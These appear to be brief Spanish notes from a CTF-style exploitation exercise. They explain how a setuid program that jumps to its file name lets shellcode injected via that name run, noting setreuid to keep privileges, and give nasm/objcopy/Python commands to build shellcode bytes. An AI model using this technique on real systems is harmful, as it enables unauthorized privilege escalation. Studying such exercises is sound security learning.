¿Porque funciona?
El programa copia el nombre de fichero (lo que vaya después de sh_) a una zona de memoria ejecutable y salta a ella. 
Es una inyección de shellcode vía nombre de fichero. Usamos ltrace para saber las llamadas a las bibliotecas
dinamicas, objdump, para inspeccionar el archivo binario, y gdb para depurar el programa, creamos el shellcode con ensamblador,
lo construimos con nasm, y extraemos los bytes. (IMPORTANTE: el shellcode tiene que tener setreuid para que no baje privilegios.)

CREAR BYTES CRUDOS EN PYTHON	
python3 -c 'import os; os.mkdir(b"")'
python3 -c 'import os; open(b"","wb").close()'

CREAR SHELLCODE PROPIO
nasm -f elf32 shellcode.s -o shellcode.o
objcopy -O binary --only-section=.text shellcode.o shellcode.bin
python3 -c 'print("".join(f"\\\\x{b:02x}" for b in open("shellcode.bin", "rb").read()))'
